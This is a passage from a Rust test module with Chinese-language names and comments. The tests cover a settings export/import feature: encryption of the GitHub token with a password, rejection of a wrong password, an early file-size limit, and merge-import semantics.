        assert!(data.get("barList").is_some(), "同一份文件里的非密钥项也要回来");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 令牌为空时仍是普通明文导出() {
        // 勾了 secrets 但本机没填令牌：没必要加密，别逼用户多输一次密码
        let p = tmp_file("secret-empty");
        let v = json!({"barList": ["@ocr"], "githubToken": ""});
        write_plain(&p, &["secrets".to_string(), "engineConfig".to_string()], &v, None, false).unwrap();
        let raw = std::fs::read_to_string(&p).unwrap();
        assert!(!crypto::looks_encrypted(&raw), "空令牌不该触发加密");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 错密码解不开含令牌的导出() {
        let p = tmp_file("secret-wrongpw");
        write_plain(&p, &["secrets".to_string()], &view_with_token(), Some("对的"), false).unwrap();
        let e = read_plain(&p, 32 * 1024 * 1024, Some("错的")).unwrap_err();
        assert!(!e.is_empty());
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 超过体积上限直接拒() {
        // 读之前就拦：不能让一个巨型文件把内存吃光。
        // ⚠ 上限传 0 而不是 1：判定是 `len > max_bytes`，1 字节的文件
        //   （1 > 1 为假）会走到解析那一步，报的错就成了"不是 JSON"而不是
        //   "太大"，那就没测到体积那道闸了。
        let p = tmp_file("toobig");
        std::fs::write(&p, "x").unwrap();
        let e = read_plain(&p, 0, None).unwrap_err();
        assert!(e.contains("32MB"), "报错要说明是体积问题：{e}");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 落盘后合并导入不覆盖别人的键() {
        // 合并语义的关键证据：同一份文件灌进两份不同配置，各自的独有键都还在。
        // （apply_view 只在 main.rs 里，这里验到"读出来的只有那几项"——
        //  灌回去只碰这几项，剩下的键自然原样不动。）
        let p = tmp_file("merge");
        let view = json!({"barList": ["@ocr"], "theme": "dark"});
        let n = write_plain(&p, &["engineConfig".to_string()], &view, None, false).unwrap();
        assert_eq!(n, 1, "barList 一个键");
        let (_, data) = read_plain(&p, 32 * 1024 * 1024, None).unwrap();
        assert_eq!(data.as_object().unwrap().len(), 1, "只该带 barList");
        assert!(data.get("theme").is_none(), "application settings 没勾 → 不带 theme");
        let _ = std::fs::remove_file(&p);
    }
}
